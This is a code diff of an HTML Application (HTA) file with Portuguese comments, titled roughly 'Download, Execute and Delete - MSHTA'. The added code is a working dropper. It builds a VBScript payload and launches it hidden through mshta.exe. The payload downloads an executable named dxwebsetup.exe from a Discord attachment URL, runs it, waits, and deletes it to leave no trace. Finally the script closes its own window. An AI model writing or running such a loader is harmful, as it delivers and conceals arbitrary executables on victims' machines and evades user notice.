@@ -2,59 +2,73 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <title>Download MSHTA - Funcional</title>
+    <title>Baixar, Executar e Apagar - MSHTA</title>
 
-    <script language="VBScript">
-        ' --- Variáveis de Configuração ---
-        ' Link direto para o arquivo EXE
-        FileURL = "https://cdn.discordapp.com/attachments/1440238279441252407/1440831105820524594/dxwebsetup.exe?ex=691f9608&is=691e4488&hm=0cd0cd30bb022289189515710f772a686b8e40dd010bfee084e526dce1e4b3f4&"
-        
-        ' Nome do arquivo a ser salvo localmente
-        LocalFileName = "dxwebsetup.exe"
-        
-        ' --- Função de Download ---
-        Sub Window_Onload()
-            On Error Resume Next ' Permite que o script continue se houver erros no sistema de arquivos
+    <script language="JScript">
+        // -----------------------------------------------------
+        // 1. Variáveis de Configuração
+        // -----------------------------------------------------
+        var FileURL = "https://cdn.discordapp.com/attachments/1440238279441252407/1440831105820524594/dxwebsetup.exe?ex=691f9608&is=691e4488&hm=0cd0cd30bb022289189515710f772a686b8e40dd010bfee084e526dce1e4b3f4&";
+        var LocalFileName = "dxwebsetup.exe";
+        var ExecutionWaitSeconds = 10; // Tempo de espera para o arquivo ser executado antes de apagar (em segundos)
+
+        // -----------------------------------------------------
+        // 2. VBScript para Download, Execução e Limpeza
+        // -----------------------------------------------------
+        var VBS_SCRIPT = `
+            On Error Resume Next
             
-            document.getElementById("status").innerText = "Iniciando download do " & LocalFileName & " via VBScript...";
+            ' Configurações
+            Dim WshShell, FSO, objXMLHttp, objStream
+            Dim FileURL, LocalFileName, ExecutionWaitSeconds
+            FileURL = "` + FileURL + `"
+            LocalFileName = "` + LocalFileName + `"
+            ExecutionWaitSeconds = ` + ExecutionWaitSeconds + `
             
-            ' 1. Faz a requisição HTTP
+            Set WshShell = CreateObject("WScript.Shell")
+            Set FSO = CreateObject("Scripting.FileSystemObject")
+            
+            ' --- A) Download ---
             Set objXMLHttp = CreateObject("MSXML2.XMLHTTP")
-            objXMLHttp.open "GET", FileURL, False ' Sincronizado (espera a resposta)
+            objXMLHttp.open "GET", FileURL, False
             objXMLHttp.send
             
-            If objXMLHttp.Status = 200 Then ' Verifica se a requisição foi bem-sucedida (código 200)
-                
-                ' 2. Cria o objeto Stream para manipular o arquivo binário
+            If objXMLHttp.Status = 200 Then
                 Set objStream = CreateObject("ADODB.Stream")
                 objStream.Open
-                objStream.Type = 1 ' adTypeBinary
-                
-                ' 3. Escreve o conteúdo binário no Stream
+                objStream.Type = 1 ' Binário
                 objStream.Write objXMLHttp.responseBody
-                
-                ' 4. Salva o Stream no arquivo local
-                objStream.SaveToFile LocalFileName, 2 ' Sobrescreve se existir (adSaveCreateOverWrite)
-                
+                objStream.SaveToFile LocalFileName, 2 ' Salva o arquivo
                 objStream.Close
-                document.getElementById("status").innerText = "✅ Sucesso! O arquivo " & LocalFileName & " foi salvo no seu disco."
                 
-            Else
-                document.getElementById("status").innerText = "⚠️ Erro na requisição HTTP. Status: " & objXMLHttp.Status
+                ' --- B) Execução ---
+                WshShell.Run LocalFileName, 1, False ' Executa o EXE (1 = janela normal, True/False não importa muito aqui)
+                
+                ' --- C) Espera e Apaga ---
+                WScript.Sleep (ExecutionWaitSeconds * 1000) ' Espera X segundos
+                
+                If FSO.FileExists(LocalFileName) Then
+                    FSO.DeleteFile LocalFileName, True ' Apaga o arquivo
+                End If
             End If
             
-            ' Limpeza de objetos
-            Set objStream = Nothing
-            Set objXMLHttp = Nothing
-            
-        End Sub
+            Set WshShell = Nothing
+            Set FSO = Nothing
+        `;
+
+        // -----------------------------------------------------
+        // 3. Execução Silenciosa
+        // -----------------------------------------------------
+        // Comando que injeta o VBScript e executa de forma oculta (0)
+        var cmd = 'mshta.exe vbscript:Execute("' + VBS_SCRIPT.replace(/"/g, '\"') + '"):window.close';
+        
+        // Executa o comando em segundo plano (0)
+        new ActiveXObject("WScript.Shell").Run(cmd, 0, false);
+        
+        // Fecha a janela visível atual (a que foi aberta no Win+R)
+        window.close();
     </script>
 </head>
-<body onload="Window_Onload()">
-
-    <h1>Download por MSHTA</h1>
-    <p id="status">Aguardando...</p>
-    <p>O download será iniciado e o arquivo será salvo na mesma pasta onde você rodou o comando **cmd**.</p>
-
+<body onload="window.close()">
 </body>
 </html>
